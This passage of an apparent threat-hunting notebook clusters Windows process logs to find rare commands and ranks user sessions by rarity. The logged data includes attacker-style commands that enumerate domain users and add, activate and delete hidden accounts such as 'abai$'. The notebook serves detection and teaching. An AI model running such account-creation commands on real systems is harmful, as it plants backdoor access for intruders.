    "display(\n",
    "    processes_on_host\n",
    "    .groupby([\"Account\", \"NewProcessName\", \"CommandLine\"])\n",
    "    [[\"TimeGenerated\"]]\n",
    "    .count()\n",
    "    .rename(columns={\"TimeGenerated\": \"Count\"})\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "collapsed": true,
    "gather": {
     "logged": 1618336754450
    },
    "jupyter": {
     "outputs_hidden": true,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [
    {
     "data": {
      "application/vnd.dataresource+json": {
       "data": [
        {
         "CommandLine": "C:\\Windows\\system32\\userinit.exe",
         "index": 3116
        },
        {
         "CommandLine": "net  user Bob1 /domain",
         "index": 6099
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user Bob1 /domain",
         "index": 6100
        },
        {
         "CommandLine": "net  user BobX /domain",
         "index": 6101
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user BobX /domain",
         "index": 6102
        },
        {
         "CommandLine": "C:\\Windows\\system32\\sc.exe start wuauserv",
         "index": 11305
        },
        {
         "CommandLine": "net  user Bob1 /domain",
         "index": 14298
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user Bob1 /domain",
         "index": 14299
        },
        {
         "CommandLine": "net  user BobX /domain",
         "index": 14300
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user BobX /domain",
         "index": 14301
        },
        {
         "CommandLine": "net  users ",
         "index": 14735
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  users ",
         "index": 14737
        },
        {
         "CommandLine": "net  user abai$ [Placeholder] /add",
         "index": 14738
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user abai$ [Placeholder] /add",
         "index": 14739
        },
        {
         "CommandLine": "net  user abai$ [Placeholder]",
         "index": 14740
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user abai$ [Placeholder]",
         "index": 14741
        },
        {
         "CommandLine": "net  users ",
         "index": 14747
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  users ",
         "index": 14749
        },
        {
         "CommandLine": "net  user www.401hk.com [Placeholder] /add",
         "index": 14750
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user www.401hk.com [Placeholder] /add",
         "index": 14751
        },
        {
         "CommandLine": "net  user www.401hk.com [Placeholder]",
         "index": 14752
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user www.401hk.com [Placeholder]",
         "index": 14753
        },
        {
         "CommandLine": "net  user www.401hk.com /active:yes",
         "index": 14754
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user www.401hk.com /active:yes",
         "index": 14755
        },
        {
         "CommandLine": "net  user abai$ /delete",
         "index": 15136
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user abai$ /delete",
         "index": 15137
        },
        {
         "CommandLine": "net  user www.401hk.com /delete",
         "index": 15138
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user www.401hk.com /delete",
         "index": 15139
        },
        {
         "CommandLine": "net  user abai$ /delete",
         "index": 22638
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user abai$ /delete",
         "index": 22639
        },
        {
         "CommandLine": "net  user www.401hk.com /delete",
         "index": 22640
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user www.401hk.com /delete",
         "index": 22641
        },
        {
         "CommandLine": "net  users ",
         "index": 22658
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  users ",
         "index": 22660
        },
        {
         "CommandLine": "net  user abai$ [Placeholder] /add",
         "index": 22661
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user abai$ [Placeholder] /add",
         "index": 22662
        },
        {
         "CommandLine": "net  user abai$ [Placeholder]",
         "index": 22663
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user abai$ [Placeholder]",
         "index": 22664
        },
        {
         "CommandLine": "net  users ",
         "index": 22670
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  users ",
         "index": 22672
        },
        {
         "CommandLine": "net  user www.401hk.com [Placeholder] /add",
         "index": 22673
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user www.401hk.com [Placeholder] /add",
         "index": 22674
        },
        {
         "CommandLine": "net  user www.401hk.com [Placeholder]",
         "index": 22675
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user www.401hk.com [Placeholder]",
         "index": 22676
        },
        {
         "CommandLine": "net  user www.401hk.com /active:yes",
         "index": 22677
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user www.401hk.com /active:yes",
         "index": 22678
        },
        {
         "CommandLine": "C:\\Windows\\system32\\userinit.exe",
         "index": 22791
        }
       ],
       "schema": {
        "fields": [
         {
          "name": "index",
          "type": "integer"
         },
         {
          "name": "CommandLine",
          "type": "string"
         }
        ],
        "pandas_version": "0.20.0",
        "primaryKey": [
         "index"
        ]
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>CommandLine</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>3116</th>\n",
       "      <td>C:\\Windows\\system32\\userinit.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6099</th>\n",
       "      <td>net  user Bob1 /domain</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6100</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user Bob1 /domain</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6101</th>\n",
       "      <td>net  user BobX /domain</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6102</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user BobX /domain</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11305</th>\n",
       "      <td>C:\\Windows\\system32\\sc.exe start wuauserv</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14298</th>\n",
       "      <td>net  user Bob1 /domain</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14299</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user Bob1 /domain</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14300</th>\n",
       "      <td>net  user BobX /domain</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14301</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user BobX /domain</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14735</th>\n",
       "      <td>net  users</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14737</th>\n",
       "      <td>C:\\Windows\\system32\\net1  users</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14738</th>\n",
       "      <td>net  user abai$ [Placeholder] /add</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14739</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user abai$ [Placeholder] /add</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14740</th>\n",
       "      <td>net  user abai$ [Placeholder]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14741</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user abai$ [Placeholder]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14747</th>\n",
       "      <td>net  users</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14749</th>\n",
       "      <td>C:\\Windows\\system32\\net1  users</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14750</th>\n",
       "      <td>net  user www.401hk.com [Placeholder] /add</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14751</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user www.401hk.com [Placeholder] /add</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14752</th>\n",
       "      <td>net  user www.401hk.com [Placeholder]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14753</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user www.401hk.com [Placeholder]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14754</th>\n",
       "      <td>net  user www.401hk.com /active:yes</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14755</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user www.401hk.com /active:yes</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15136</th>\n",
       "      <td>net  user abai$ /delete</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15137</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user abai$ /delete</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15138</th>\n",
       "      <td>net  user www.401hk.com /delete</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15139</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user www.401hk.com /delete</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22638</th>\n",
       "      <td>net  user abai$ /delete</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22639</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user abai$ /delete</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22640</th>\n",
       "      <td>net  user www.401hk.com /delete</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22641</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user www.401hk.com /delete</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22658</th>\n",
       "      <td>net  users</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22660</th>\n",
       "      <td>C:\\Windows\\system32\\net1  users</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22661</th>\n",
       "      <td>net  user abai$ [Placeholder] /add</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22662</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user abai$ [Placeholder] /add</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22663</th>\n",
       "      <td>net  user abai$ [Placeholder]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22664</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user abai$ [Placeholder]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22670</th>\n",
       "      <td>net  users</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22672</th>\n",
       "      <td>C:\\Windows\\system32\\net1  users</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22673</th>\n",
       "      <td>net  user www.401hk.com [Placeholder] /add</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22674</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user www.401hk.com [Placeholder] /add</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22675</th>\n",
       "      <td>net  user www.401hk.com [Placeholder]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22676</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user www.401hk.com [Placeholder]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22677</th>\n",
       "      <td>net  user www.401hk.com /active:yes</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22678</th>\n",
       "      <td>C:\\Windows\\system32\\net1  user www.401hk.com /active:yes</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22791</th>\n",
       "      <td>C:\\Windows\\system32\\userinit.exe</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                           CommandLine\n",
       "3116                                  C:\\Windows\\system32\\userinit.exe\n",
       "6099                                            net  user Bob1 /domain\n",
       "6100                       C:\\Windows\\system32\\net1  user Bob1 /domain\n",
       "6101                                            net  user BobX /domain\n",
       "6102                       C:\\Windows\\system32\\net1  user BobX /domain\n",
       "11305                        C:\\Windows\\system32\\sc.exe start wuauserv\n",
       "14298                                           net  user Bob1 /domain\n",
       "14299                      C:\\Windows\\system32\\net1  user Bob1 /domain\n",
       "14300                                           net  user BobX /domain\n",
       "14301                      C:\\Windows\\system32\\net1  user BobX /domain\n",
       "14735                                                      net  users \n",
       "14737                                 C:\\Windows\\system32\\net1  users \n",
       "14738                               net  user abai$ [Placeholder] /add\n",
       "14739          C:\\Windows\\system32\\net1  user abai$ [Placeholder] /add\n",
       "14740                                    net  user abai$ [Placeholder]\n",
       "14741               C:\\Windows\\system32\\net1  user abai$ [Placeholder]\n",
       "14747                                                      net  users \n",
       "14749                                 C:\\Windows\\system32\\net1  users \n",
       "14750                       net  user www.401hk.com [Placeholder] /add\n",
       "14751  C:\\Windows\\system32\\net1  user www.401hk.com [Placeholder] /add\n",
       "14752                            net  user www.401hk.com [Placeholder]\n",
       "14753       C:\\Windows\\system32\\net1  user www.401hk.com [Placeholder]\n",
       "14754                              net  user www.401hk.com /active:yes\n",
       "14755         C:\\Windows\\system32\\net1  user www.401hk.com /active:yes\n",
       "15136                                          net  user abai$ /delete\n",
       "15137                     C:\\Windows\\system32\\net1  user abai$ /delete\n",
       "15138                                  net  user www.401hk.com /delete\n",
       "15139             C:\\Windows\\system32\\net1  user www.401hk.com /delete\n",
       "22638                                          net  user abai$ /delete\n",
       "22639                     C:\\Windows\\system32\\net1  user abai$ /delete\n",
       "22640                                  net  user www.401hk.com /delete\n",
       "22641             C:\\Windows\\system32\\net1  user www.401hk.com /delete\n",
       "22658                                                      net  users \n",
       "22660                                 C:\\Windows\\system32\\net1  users \n",
       "22661                               net  user abai$ [Placeholder] /add\n",
       "22662          C:\\Windows\\system32\\net1  user abai$ [Placeholder] /add\n",
       "22663                                    net  user abai$ [Placeholder]\n",
       "22664               C:\\Windows\\system32\\net1  user abai$ [Placeholder]\n",
       "22670                                                      net  users \n",
       "22672                                 C:\\Windows\\system32\\net1  users \n",
       "22673                       net  user www.401hk.com [Placeholder] /add\n",
       "22674  C:\\Windows\\system32\\net1  user www.401hk.com [Placeholder] /add\n",
       "22675                            net  user www.401hk.com [Placeholder]\n",
       "22676       C:\\Windows\\system32\\net1  user www.401hk.com [Placeholder]\n",
       "22677                              net  user www.401hk.com /active:yes\n",
       "22678         C:\\Windows\\system32\\net1  user www.401hk.com /active:yes\n",
       "22791                                 C:\\Windows\\system32\\userinit.exe"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "processes_on_host = processes_on_host.replace({\"CommandLine\": {\"Wf9k44_sinc9d3\\[=\\$\": \"[Placeholder]\", \"Wf9k44_9d\\[=\\$\": \"[Placeholder]\"}}, regex=True)\r\n",
    "display(processes_on_host[processes_on_host[\"CommandLine\"].str.contains(\"user\")][[\"CommandLine\"]])\r\n",
    "# processes_on_host.to_pickle(\"./data/processes_on_host2.pkl\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Clustering motivation\n",
    "\n",
    "We want to find atypical commands being run and see if they are associated with\n",
    "the same user or time period<br>\n",
    "\n",
    "It is tedious to do repeated queries grouping on different attributes of events.<br>\n",
    "Instead we can specify features that we are interested in grouping around and use<br>\n",
    "clustering, a form of unsupervised learning, to group the data. \n",
    "\n",
    "A challenge when using simple grouping is that commands (commandlines) may vary slightly\n",
    "but are essentially repetitions of the same thing (e.g. contain dynamically-generated\n",
    "GUIDs or other temporary data).\n",
    "\n",
    "We can extract features of the commandline rather than using it in its raw form.\n",
    "\n",
    "Using clustering we can add arbitrarily many features to group on. Here we are using the following features:\n",
    "- Account name\n",
    "- Process name\n",
    "- Command line structure\n",
    "- Whether the process is a system session or not\n",
    "\n",
    "> **Note**: A downside to clustering is that text features (usually) need to be transformed from a string<br>\n",
    "> into a numeric representation."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {
    "gather": {
     "logged": 1618336998754
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Input data: 22979 events\n",
      "Extracting features....done\n",
      "Clustering...done\n",
      "Number of input events: 22979\n",
      "Number of clustered events: 316\n",
      "Merging with source data and computing rarity...done\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<p style='font-size: 130%;font-weight: bold'><br><hr>Sessions ordered by process rarity</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Higher score indicates higher number of unusual processes</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<style  type=\"text/css\" >\n",
       "    #T_878761ce_9c82_11eb_a51b_000d3af5dc9brow0_col2 {\n",
       "            width:  10em;\n",
       "             height:  80%;\n",
       "            background:  linear-gradient(90deg,#d65f5f 100.0%, transparent 100.0%);\n",
       "        }    #T_878761ce_9c82_11eb_a51b_000d3af5dc9brow1_col2 {\n",
       "            width:  10em;\n",
       "             height:  80%;\n",
       "            background:  linear-gradient(90deg,#d65f5f 72.7%, transparent 72.7%);\n",
       "        }    #T_878761ce_9c82_11eb_a51b_000d3af5dc9brow2_col2 {\n",
       "            width:  10em;\n",
       "             height:  80%;\n",
       "            background:  linear-gradient(90deg,#d65f5f 71.0%, transparent 71.0%);\n",
       "        }    #T_878761ce_9c82_11eb_a51b_000d3af5dc9brow3_col2 {\n",
       "            width:  10em;\n",
       "             height:  80%;\n",
       "            background:  linear-gradient(90deg,#d65f5f 67.0%, transparent 67.0%);\n",
       "        }    #T_878761ce_9c82_11eb_a51b_000d3af5dc9brow4_col2 {\n",
       "            width:  10em;\n",
       "             height:  80%;\n",
       "            background:  linear-gradient(90deg,#d65f5f 57.3%, transparent 57.3%);\n",
       "        }    #T_878761ce_9c82_11eb_a51b_000d3af5dc9brow5_col2 {\n",
       "            width:  10em;\n",
       "             height:  80%;\n",
       "            background:  linear-gradient(90deg,#d65f5f 47.1%, transparent 47.1%);\n",
       "        }    #T_878761ce_9c82_11eb_a51b_000d3af5dc9brow6_col2 {\n",
       "            width:  10em;\n",
       "             height:  80%;\n",
       "            background:  linear-gradient(90deg,#d65f5f 47.1%, transparent 47.1%);\n",
       "        }    #T_878761ce_9c82_11eb_a51b_000d3af5dc9brow7_col2 {\n",
       "            width:  10em;\n",
       "             height:  80%;\n",
       "            background:  linear-gradient(90deg,#d65f5f 39.1%, transparent 39.1%);\n",
       "        }    #T_878761ce_9c82_11eb_a51b_000d3af5dc9brow8_col2 {\n",
       "            width:  10em;\n",
       "             height:  80%;\n",
       "            background:  linear-gradient(90deg,#d65f5f 39.1%, transparent 39.1%);\n",
       "        }    #T_878761ce_9c82_11eb_a51b_000d3af5dc9brow9_col2 {\n",
       "            width:  10em;\n",
       "             height:  80%;\n",
       "            background:  linear-gradient(90deg,#d65f5f 38.5%, transparent 38.5%);\n",
       "        }    #T_878761ce_9c82_11eb_a51b_000d3af5dc9brow10_col2 {\n",
       "            width:  10em;\n",
       "             height:  80%;\n",
       "            background:  linear-gradient(90deg,#d65f5f 32.9%, transparent 32.9%);\n",
       "        }    #T_878761ce_9c82_11eb_a51b_000d3af5dc9brow11_col2 {\n",
       "            width:  10em;\n",
       "             height:  80%;\n",
       "            background:  linear-gradient(90deg,#d65f5f 32.9%, transparent 32.9%);\n",
       "        }    #T_878761ce_9c82_11eb_a51b_000d3af5dc9brow12_col2 {\n",
       "            width:  10em;\n",
       "             height:  80%;\n",
       "            background:  linear-gradient(90deg,#d65f5f 9.0%, transparent 9.0%);\n",
       "        }    #T_878761ce_9c82_11eb_a51b_000d3af5dc9brow13_col2 {\n",
       "            width:  10em;\n",
       "             height:  80%;\n",
       "            background:  linear-gradient(90deg,#d65f5f 5.6%, transparent 5.6%);\n",
       "        }    #T_878761ce_9c82_11eb_a51b_000d3af5dc9brow14_col2 {\n",
       "            width:  10em;\n",
       "             height:  80%;\n",
       "            background:  linear-gradient(90deg,#d65f5f 1.3%, transparent 1.3%);\n",
       "        }    #T_878761ce_9c82_11eb_a51b_000d3af5dc9brow15_col2 {\n",
       "            width:  10em;\n",
       "             height:  80%;\n",
       "        }</style><table id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9b\" ><thead>    <tr>        <th class=\"blank level0\" ></th>        <th class=\"col_heading level0 col0\" >SubjectUserName</th>        <th class=\"col_heading level0 col1\" >SubjectLogonId</th>        <th class=\"col_heading level0 col2\" >Rarity</th>        <th class=\"col_heading level0 col3\" >ProcessCount</th>    </tr></thead><tbody>\n",
       "                <tr>\n",
       "                        <th id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9blevel0_row0\" class=\"row_heading level0 row0\" >15</th>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow0_col0\" class=\"data row0 col0\" >ian</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow0_col1\" class=\"data row0 col1\" >0x5d5af2</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow0_col2\" class=\"data row0 col2\" >0.607143</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow0_col3\" class=\"data row0 col3\" >56</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9blevel0_row1\" class=\"row_heading level0 row1\" >9</th>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow1_col0\" class=\"data row1 col0\" >MSTICAdmin</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow1_col1\" class=\"data row1 col1\" >0xbd57571</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow1_col2\" class=\"data row1 col2\" >0.44263</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow1_col3\" class=\"data row1 col3\" >38</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9blevel0_row2\" class=\"row_heading level0 row2\" >2</th>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow2_col0\" class=\"data row2 col0\" >MSTICAdmin</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow2_col1\" class=\"data row2 col1\" >0x109c408</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow2_col2\" class=\"data row2 col2\" >0.432549</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow2_col3\" class=\"data row2 col3\" >10</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9blevel0_row3\" class=\"row_heading level0 row3\" >5</th>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow3_col0\" class=\"data row3 col0\" >MSTICAdmin</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow3_col1\" class=\"data row3 col1\" >0x2e2017</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow3_col2\" class=\"data row3 col2\" >0.408239</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow3_col3\" class=\"data row3 col3\" >33</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9blevel0_row4\" class=\"row_heading level0 row4\" >0</th>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow4_col0\" class=\"data row4 col0\" >-</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow4_col1\" class=\"data row4 col1\" >0x3e7</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow4_col2\" class=\"data row4 col2\" >0.35</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow4_col3\" class=\"data row4 col3\" >20</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9blevel0_row5\" class=\"row_heading level0 row5\" >7</th>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow5_col0\" class=\"data row5 col0\" >MSTICAdmin</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow5_col1\" class=\"data row5 col1\" >0x78225e</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow5_col2\" class=\"data row5 col2\" >0.288251</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow5_col3\" class=\"data row5 col3\" >21</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9blevel0_row6\" class=\"row_heading level0 row6\" >10</th>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow6_col0\" class=\"data row6 col0\" >MSTICAdmin</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow6_col1\" class=\"data row6 col1\" >0xbed1e13</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow6_col2\" class=\"data row6 col2\" >0.288251</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow6_col3\" class=\"data row6 col3\" >21</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9blevel0_row7\" class=\"row_heading level0 row7\" >3</th>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow7_col0\" class=\"data row7 col0\" >MSTICAdmin</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow7_col1\" class=\"data row7 col1\" >0x1e821b5</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow7_col2\" class=\"data row7 col2\" >0.239992</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow7_col3\" class=\"data row7 col3\" >8</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9blevel0_row8\" class=\"row_heading level0 row8\" >8</th>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow8_col0\" class=\"data row8 col0\" >MSTICAdmin</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow8_col1\" class=\"data row8 col1\" >0xab5a5ac</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow8_col2\" class=\"data row8 col2\" >0.239992</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow8_col3\" class=\"data row8 col3\" >8</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9blevel0_row9\" class=\"row_heading level0 row9\" >11</th>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow9_col0\" class=\"data row9 col0\" >MSTICAdmin</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow9_col1\" class=\"data row9 col1\" >0xc277459</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow9_col2\" class=\"data row9 col2\" >0.236656</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow9_col3\" class=\"data row9 col3\" >6</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9blevel0_row10\" class=\"row_heading level0 row10\" >4</th>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow10_col0\" class=\"data row10 col0\" >MSTICAdmin</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow10_col1\" class=\"data row10 col1\" >0x1f388a3</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow10_col2\" class=\"data row10 col2\" >0.202848</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow10_col3\" class=\"data row10 col3\" >7</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9blevel0_row11\" class=\"row_heading level0 row11\" >12</th>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow11_col0\" class=\"data row11 col0\" >MSTICAdmin</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow11_col1\" class=\"data row11 col1\" >0xc54c7b9</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow11_col2\" class=\"data row11 col2\" >0.202848</td>\n",
